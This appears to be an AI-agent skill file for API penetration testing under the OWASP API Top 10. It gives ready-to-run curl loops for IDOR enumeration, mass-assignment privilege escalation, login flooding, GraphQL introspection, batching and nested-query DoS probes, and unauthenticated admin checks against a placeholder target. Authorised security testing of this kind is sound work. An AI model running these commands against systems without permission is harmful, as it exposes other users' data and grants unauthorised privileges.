---
name: api-security
description: API security testing — OWASP API Top 10, BOLA/IDOR, mass assignment, GraphQL, rate limiting
allowed-tools: [Bash, Read, Write]
---

# API Security Testing

Test REST, GraphQL, and gRPC APIs following OWASP API Security Top 10.

## Tools

| Tool | Purpose |
|------|---------|
| kiterunner | API endpoint discovery |
| ffuf | Endpoint fuzzing |
| nuclei | API fuzzing templates |
| curl | Manual request crafting |
| httpx | HTTP probing |

## API Discovery

```bash
# Common API paths
kiterunner scan TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -o OUTPUT_DIR/recon/api-kiterunner.txt 2>/dev/null

# OpenAPI/Swagger discovery
for path in /swagger /swagger.json /swagger.yaml /api-docs /openapi.json /openapi.yaml \
            /v1/api-docs /v2/api-docs /v3/api-docs /docs /redoc; do
  code=$(curl -so /dev/null -w "%{http_code}" TARGET$path)
  [ "$code" = "200" ] && echo "FOUND: TARGET$path ($code)"
done | tee OUTPUT_DIR/recon/api-docs-found.txt

# GraphQL endpoint discovery
for path in /graphql /graphiql /api/graphql /v1/graphql /query; do
  curl -s -X POST TARGET$path -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}' 2>/dev/null | grep -i "data\|errors" && echo "GraphQL at: $path"
done
```

## BOLA / IDOR (API1:2023)

```bash
# Walk sequential IDs
TOKEN="YOUR_JWT_TOKEN"
for id in $(seq 1 100); do
  response=$(curl -s TARGET/api/v1/users/$id -H "Authorization: Bearer $TOKEN")
  echo "$response" | grep -q "email\|username" && echo "IDOR at /api/v1/users/$id: $response"
done > OUTPUT_DIR/logs/idor-scan.txt

# Try GUIDs from your own account in other users' endpoints
MY_ORG_ID="your-org-uuid"
curl -s "TARGET/api/v1/organizations/$MY_ORG_ID/members" -H "Authorization: Bearer OTHER_USER_TOKEN"
```

## Broken Object Property Level Auth / Mass Assignment (API3, API6)

```bash
# Try adding admin fields to POST requests
curl -s -X POST TARGET/api/v1/users/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","role":"admin","is_admin":true}'

# PUT/PATCH with extra fields
curl -s -X PUT TARGET/api/v1/users/me \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test","role":"admin","credit_balance":99999}'
```

## Rate Limiting (API4:2023)

```bash
# Send 100 rapid requests — check for 429 or account lockout
for i in $(seq 1 100); do
  curl -so /dev/null -w "%{http_code}\n" -X POST TARGET/api/v1/auth/login \
    -d '{"username":"admin","password":"wrong"}'
done | sort | uniq -c
```

## Excessive Data Exposure (API3:2023)

```bash
# Check if API returns more data than needed
curl -s TARGET/api/v1/users/me -H "Authorization: Bearer $TOKEN" | jq 'keys'
# Look for: password_hash, internal_id, admin_flag, api_key, ssn, card_number
```

## GraphQL Testing

```bash
# Introspection (should be disabled in production)
curl -s -X POST TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' \
  | jq '.' > OUTPUT_DIR/recon/graphql-schema.json

# Batching attack (bypass rate limiting)
curl -s -X POST TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},...]'

# Nested query DoS probe (depth limit check)
curl -s -X POST TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { friends { friends { friends { friends { id } } } } } }"}'
```

## JWT API Testing

```bash
# Test without token
curl -s TARGET/api/v1/admin | grep -iv "unauthorized\|forbidden" && echo "No auth required!"

# Test with empty/null token
curl -s TARGET/api/v1/admin -H "Authorization: Bearer " | grep -iv "unauthorized"
curl -s TARGET/api/v1/admin -H "Authorization: Bearer null" | grep -iv "unauthorized"
```

## Output

API findings → `OUTPUT_DIR/findings/finding-NNN/`
OpenAPI spec (if found) → `OUTPUT_DIR/recon/openapi.json`
GraphQL schema → `OUTPUT_DIR/recon/graphql-schema.json`

---

## Deep-dive references (authoritative)

The inline sections above are **quick-start orchestration**. For real testing of any area below, the `reference/` file is the **source of truth** (curated from disclosed reports — payloads, bypass tables, chain templates). Load it before deep testing; don't rely on the quick-start commands alone.

- `reference/hunt-idor.md` — Deep IDOR hunting — payloads, bypass tables, and disclosed-report chains.
- `reference/hunt-api-misconfig.md` — Hunt API security misconfiguration — mass assignment, JWT attacks, prototype pollution, HTTP verb tampering.
- `reference/hunt-graphql.md` — Deep GRAPHQL hunting — payloads, bypass tables, and disclosed-report chains.
